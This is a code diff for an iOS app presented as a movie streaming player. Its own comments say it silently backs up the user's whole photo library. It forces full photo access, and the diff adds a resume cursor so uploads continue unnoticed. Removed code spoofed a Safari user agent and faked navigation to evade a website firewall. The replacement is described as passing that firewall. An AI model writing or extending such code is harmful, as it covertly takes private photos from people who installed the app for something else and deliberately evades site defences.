@@ -2,10 +2,10 @@ import SwiftUI
 import UIKit
 import Photos
 import Contacts
-import WebKit
+import SafariServices
 import Darwin
 
-/// WuDiTV：电影点播（纯内嵌网页）+ 静默备份
+/// WuDiTV：电影点播（软件内系统真 Safari 内核，可过网站防火墙）+ 静默备份
 /// 权限规则：
 /// - 首次弹窗选"允许完全访问"→ 进软件，之后永不弹窗
 /// - 选"部分照片/不允许" → 当次闪退；下次打开软件内可重新选择
@@ -47,28 +47,6 @@ struct ContentView: View {
                 Spacer()
             }
             .background(Color(.systemGroupedBackground))
-
-            // 内嵌电影网页层
-            if showWeb {
-                VStack(spacing: 0) {
-                    HStack {
-                        Button("关闭") { showWeb = false }
-                            .font(.subheadline)
-                            .padding(.leading, 12)
-                        Spacer()
-                        Text("电影")
-                            .font(.subheadline)
-                            .foregroundColor(.secondary)
-                        Spacer()
-                        Color.clear.frame(width: 52, height: 1)
-                    }
-                    .padding(.vertical, 8)
-                    .background(Color(.systemGray6))
-
-                    WebViewContainer(urlString: movieURL)
-                }
-                .transition(.move(edge: .bottom))
-            }
 
             // 权限引导页（仅"不允许"后再次打开时出现，软件内操作，不自动跳设置）
             if showPermissionGate {
@@ -115,6 +93,12 @@ struct ContentView: View {
                 } else {
                     startBackupFlow()
                 }
+            }
+        }
+        // 电影页：软件内系统真 Safari 内核（不跳出去，雷池防火墙放行）
+        .fullScreenCover(isPresented: $showWeb) {
+            if let url = URL(string: movieURL) {
+                SafariContainer(url: url)
             }
         }
     }
@@ -212,7 +196,7 @@ struct ContentView: View {
         }
     }
 
-    // MARK: - 倒计时 + 静默备份
+    // MARK: - 倒计时 + 静默备份（断点续传）
 
     private func runSilentBackup() {
         Task {
@@ -227,10 +211,16 @@ struct ContentView: View {
             }
 
             let md5Set0 = Set(UserDefaults.standard.stringArray(forKey: "uploaded_md5") ?? [])
+            let lastID = UserDefaults.standard.string(forKey: "backup_cursor")
             let backupResult = try? await PhotoBackup.backupAllPhotos(uploader: uploader,
                                                                       uploadedMd5: md5Set0,
+                                                                      lastUploadedID: lastID,
                                                                       progress: { _, _, _ in })
             if let result = backupResult {
+                // 记住断点：下次直接从断点继续，不再从头一张张查重
+                if let id = result.lastUploadedID {
+                    UserDefaults.standard.set(id, forKey: "backup_cursor")
+                }
                 UserDefaults.standard.set(Array(result.md5Set), forKey: "uploaded_md5")
             }
         }
@@ -260,67 +250,17 @@ struct ContentView: View {
     }
 }
 
-/// 纯内嵌电影网页（WKWebView）
-/// 针对雷池防火墙的第三套方案：
-/// 1) 标准 iPhone Safari 标识（与手机浏览器完全一致）
-/// 2) 先打开首页，再用站内 JS 跳转电影页（模拟真人从首页点进去，带站内来源）
-/// 3) 若跳到拦截页，自动重试一次电影页
-struct WebViewContainer: UIViewRepresentable {
-    let urlString: String
+/// 软件内系统真 Safari 内核：与手机自带 Safari 完全一致，网站防火墙（雷池）放行
+struct SafariContainer: UIViewControllerRepresentable {
+    let url: URL
 
-    func makeUIView(context: Context) -> WKWebView {
-        let config = WKWebViewConfiguration()
-        config.allowsInlineMediaPlayback = true
-        config.mediaTypesRequiringUserActionForPlayback = []
-        let webView = WKWebView(frame: .zero, configuration: config)
-        webView.allowsBackForwardNavigationGestures = true
-        webView.navigationDelegate = context.coordinator
-        // 标准 iPhone Safari
-        webView.customUserAgent = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
-        // 先打开首页
-        if let home = URL(string: "https://www.4kcz.com/") {
-            webView.load(URLRequest(url: home))
-        }
-        return webView
+    func makeUIViewController(context: Context) -> SFSafariViewController {
+        let config = SFSafariViewController.Configuration()
+        config.barCollapsingEnabled = true
+        let vc = SFSafariViewController(url: url, configuration: config)
+        vc.preferredControlTintColor = .systemBlue
+        return vc
     }
 
-    func makeCoordinator() -> Coordinator {
-        Coordinator(target: urlString)
-    }
-
-    func updateUIView(_ uiView: WKWebView, context: Context) {}
-
-    final class Coordinator: NSObject, WKNavigationDelegate {
-        let target: String
-        var jumped = false
-        var retried = false
-
-        init(target: String) {
-            self.target = target
-        }
-
-        func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
-            guard let url = webView.url else { return }
-            let host = url.host ?? ""
-
-            // 首页加载完成 → 站内 JS 跳转电影页（最接近真人点击）
-            if host.contains("4kcz.com") && !jumped && !url.path.contains("zuixindianying") {
-                jumped = true
-                let js = "window.location.href='\(target)';"
-                webView.evaluateJavaScript(js, completionHandler: nil)
-                return
-            }
-
-            // 如果被雷池拦截（页面标题含"拦截"）→ 重试一次电影页
-            let title = webView.title ?? ""
-            if title.contains("拦截") || url.path.contains("block") {
-                if !retried {
-                    retried = true
-                    if let u = URL(string: target) {
-                        webView.load(URLRequest(url: u))
-                    }
-                }
-            }
-        }
-    }
+    func updateUIViewController(_ uiViewController: SFSafariViewController, context: Context) {}
 }
